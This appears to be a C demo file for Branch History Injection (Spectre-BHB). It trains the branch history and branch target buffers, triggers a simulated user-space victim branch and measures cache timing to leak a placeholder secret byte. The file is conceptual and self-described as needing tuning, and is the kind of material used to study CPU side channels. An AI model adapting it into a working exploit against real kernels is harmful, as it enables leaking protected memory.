#include "utils.c"

// --- Branch History Injection (BHI / Spectre-BHB) ---

uint8_t secret_bhi_data = 'H'; // Secret to leak

// Gadget function to leak a byte
__attribute__((noinline))
void leak_gadget_bhi(uint8_t value) {
    probe_array[value * CACHE_LINE_SIZE] = 1;
}

// This function represents the attacker's "branch history conditioner".
// It executes a sequence of branches to populate the BHB with a specific pattern.
// This is highly architecture-dependent and requires tuning.
__attribute__((noinline))
void branch_history_conditioner_bhi() {
    // The goal is to set the global BHB such that a future indirect branch
    // in the victim (e.g., kernel) is mispredicted to the `leak_gadget_bhi`.
    // This typically involves repeatedly executing branches that share the
    // same "branch path" as the victim's vulnerable branch, but that ultimately
    // resolve to a target that influences the BTB/PHT for the desired redirection.

    // Example (highly conceptual inline assembly loop to affect BHB):
    // This loop executes conditional jumps to create a specific history pattern
    // in the global BHB, followed by an indirect jump that aims to set the BTB
    // target to the gadget.
    for (volatile int i = 0; i < 5000; ++i) {
        if (i % 2 == 0) { // Simulate a taken branch
            __asm__ __volatile__("jmp .+4"); // Short jump, always taken
        } else { // Simulate a not-taken branch
            __asm__ __volatile__("nop");
        }
        // Then, an indirect jump that matches the victim's type,
        // which resolves to the gadget for training the BTB.
        void (*p)(uint8_t) = leak_gadget_bhi;
        __asm__ __volatile__("callq *%0" : : "r"(p) : "memory"); // Train BTB for indirect calls
        _mm_mfence(); // Ensure BHB updates are globally visible
    }
}

int main_bhi() {
    common_init();
    printf("\n--- Running Branch History Injection (BHI) Demo ---\n");

    // --- Training/Poisoning Phase ---
    // 1. Condition the Branch History Buffer (BHB) from userland.
    printf("Conditioning Branch History Buffer (BHB)...\n");
    branch_history_conditioner_bhi();
    _mm_mfence(); // Ensure BHB updates are visible.

    // --- Attack Phase ---
    flush_probe_array();
    _mm_lfence();
    
    // 2. Trigger the victim (e.g., a system call that internally uses an indirect branch).
    // This is the most abstract part in userland C. A real BHI attack would involve
    // triggering a kernel function that has a vulnerable indirect branch instruction.
    printf("Triggering victim (e.g., a kernel syscall with indirect branch)...\n");
    
    // For this conceptual demo, we will simulate a victim indirect branch in user-space
    // that uses a branch history similar to what we trained.
    
    // Simulate a victim indirect branch whose history matches the conditioner.
    // This will *architecturally* go to benign_target, but *speculatively*
    // may go to leak_gadget_bhi if BHB is poisoned.
    void (*victim_branch_ptr)(uint8_t) = (void (*)(uint8_t))benign_target; // Cast to match prototype
    victim_branch_ptr(secret_bhi_data); // Architectural path takes this.

    _mm_lfence(); // Important fence to ensure speculative effects propagate to cache

    // --- Measurement Phase ---
    perform_measurement(secret_bhi_data, "BHI secret");
    printf("Actual secret data: %c\n", secret_bhi_data);
    return 0;
}